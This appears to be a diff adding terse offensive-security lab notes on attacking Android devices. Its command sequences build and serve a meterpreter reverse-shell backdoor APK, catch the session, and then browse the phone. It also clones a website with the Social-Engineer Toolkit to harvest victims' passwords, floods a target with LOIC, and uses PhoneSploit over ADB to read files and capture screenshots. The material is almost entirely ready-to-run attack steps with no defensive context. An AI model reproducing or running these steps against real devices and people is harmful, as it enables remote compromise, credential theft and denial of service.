@@ -1,0 +1,71 @@
+<<<<< Hack Android Devices>>>>>>
+
+<<Hack an Android device by creating binary payloads using Parrot Security>>
+
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=ip R > Desktop/Backdoor.apk 
+
+share, using below commands:
+mkdir /var/www/html/share and press Enter to create a shared folder
+chmod -R 755 /var/www/html/share and press Enter
+chown -R www-data:www-data /var/www/html/share and press Enter
+service apache2 start
+cp /root/Desktop/Backdoor.apk /var/www/html/share/
+
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp and press Enter.
+set LHOST ip and press Enter.
+show options and press Enter. 
+exploit -j -z
+
+in android device browser type http://ip/share
+install backdoor package
+
+on terminal you will get meterpreter
+sessions -i 1
+sysinfo
+ipconfig
+pwd
+cd /sdcard
+pwd
+ps
+
+<<Harvest Users’ Credentials using the Social-Engineer Toolkit>>
+cd setoolkit
+./setoolkit
+Type 1 and press Enter to choose Social-Engineering Attacks
+Type 2 and press Enter to choose Website Attack Vectors.
+Type 3 and press Enter to choose Credential Harvester Attack Method.
+Type 2 and press Enter to choose Site Cloner
+Enter target ip
+Enter url to clone
+once cloned website send url to victim once he clicked you will get username and password
+
+<<Launch a DoS attack on a target machine using Low Orbital Cannon (LOIC) on the Android mobile platform>>
+(cx file explorer) install LOIC app in the android device
+click the GET IP button.
+Manual IP option
+To launch the attack, first select the TCP radio button; in the right pane, enter 80 as the Port number and in the Threads field, enter 100.
+start
+open wireshark
+check for tcp packets
+stop capturing
+
+<<Exploit the Android platform through ADB using PhoneSploit>>
+cd PhoneSploit 
+python3 -m pip install colorama 
+python3 phonesploit.py 
+Type 3 ->> Enter 
+type the target Android device’s IP address 
+at the main_menu prompt, type 4
+pwd
+ls
+cd sdcard
+ls
+cd Download
+ls
+images.jpeg
+exit
+type 7 in main menu to cpature screenshot
+/home/attacker/Desktop 
+------------------------------------------------------------------------------------------------------------
